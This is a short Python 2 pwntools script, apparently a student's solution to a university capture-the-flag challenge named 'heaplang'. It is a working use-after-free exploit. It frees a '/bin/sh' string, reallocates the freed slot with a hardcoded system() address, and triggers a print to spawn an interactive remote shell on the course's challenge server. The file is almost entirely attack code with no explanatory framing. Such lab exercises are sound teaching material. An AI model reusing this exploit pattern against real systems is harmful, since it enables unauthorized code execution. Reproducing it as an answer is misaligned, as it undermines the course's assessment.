#!/usr/bin/env python

"""
Jaime Danguillecourt
jd3846
"""

from pwn import *

REMOTE = True
proc = "./heaplang"
#context.log_level = "debug"

if REMOTE == False:
	p = process(proc)
	#pause()
	#gdb.attach(p) #"set follow-fork-mode parent")
else:
	p = remote("offsec-chalbroker.osiris.cyber.nyu.edu",1345)
	p.sendline("jd3846")
	p.recvuntil("...")


e = ELF(proc)
system = "0x00000000004006e0"
bin_sh = "0x0068732f6e69622f"

def create_int(num):
	print p.recvuntil("> ") #recieve the menu
	p.sendline("1") #create variable
	print "1"
	print p.recvline()
	p.sendline("0") #create num
	print "0"
	print p.recvline()
	p.sendline(num) #send num
	#print hex(u64(num))

def create_string(string, size):
	print p.recvuntil("> ") #recieve the menu
	p.sendline("1") #create variable
	print "1"
	print p.recvline()
	p.sendline("1") #create string
	print "0"
	print p.recvline()
	p.sendline(size) #length of string
	print size
	print p.recvline()
	p.sendline(string) #send string
	print string

def delete_var(index):
	print p.recvuntil("> ") #recieve the menu
	p.sendline("4") #delete variable
	print "4"
	print p.recvline()
	p.sendline(index) #delete at index
	print index

def print_variable(index):
	print p.recvuntil("> ") #recieve the menu
	p.sendline("3") #print variable
	print "3"
	print p.recvline()
	p.sendline(index) #print index 
	print index


def main():
	create_string("/bin/sh", "8")
	p.recvuntil("> ")
	delete_var("0")
	create_int(system)
	create_int(bin_sh)
	print_variable("0")


	print "Enjoy your shell!"
	p.interactive()

if __name__ == "__main__":
	main()
